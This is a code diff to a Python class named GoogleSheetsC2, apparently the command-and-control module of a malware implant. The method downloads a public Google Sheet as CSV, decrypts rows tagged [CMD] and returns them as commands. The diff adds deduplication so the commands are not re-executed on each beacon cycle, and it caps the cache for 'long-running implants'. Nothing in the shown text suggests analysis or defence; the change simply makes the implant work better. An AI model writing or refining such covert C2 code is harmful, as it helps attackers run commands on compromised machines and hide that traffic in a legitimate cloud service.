@@ -292,17 +292,37 @@ class GoogleSheetsC2:
         """
         Download sheet as CSV, parse [CMD] rows, decrypt commands.
         No auth needed if sheet is public-readable.
+
+        Dedup: the whole CSV is re-read on every poll, so rows already
+        returned in a previous poll MUST be skipped -- otherwise the same
+        [CMD] entries are re-executed on every beacon cycle. The _cmd_cache
+        attribute existed but was never used.
         """
         csv = _http_get(self._csv_url())
         if not csv:
             return []
+        seen_keys = {id(c) for c in self._cmd_cache} if self._cmd_cache else set()
+        # Fallback identity when cached entries lack a stable id.
+        seen_reprs = {repr(c) for c in self._cmd_cache}
         commands = []
         for line in csv.splitlines():
             if "[CMD]" in line:
                 enc = line.split("[CMD]", 1)[1].strip().strip('"')
                 cmd = _dec(enc, self.passphrase)
-                if cmd:
-                    commands.append(cmd)
+                if not cmd:
+                    continue
+                if isinstance(cmd, dict):
+                    key = cmd.get("id") or cmd.get("ts") or repr(cmd)
+                else:
+                    key = repr(cmd)
+                if key in seen_keys or repr(cmd) in seen_reprs:
+                    continue  # already delivered in a previous poll
+                commands.append(cmd)
+        if commands:
+            self._cmd_cache.extend(commands)
+            # Keep the cache bounded (last 500 commands) so long-running
+            # implants don't grow memory indefinitely.
+            self._cmd_cache = self._cmd_cache[-500:]
         return commands
 
     def send_beacon(self, agent_data: Dict) -> bool:
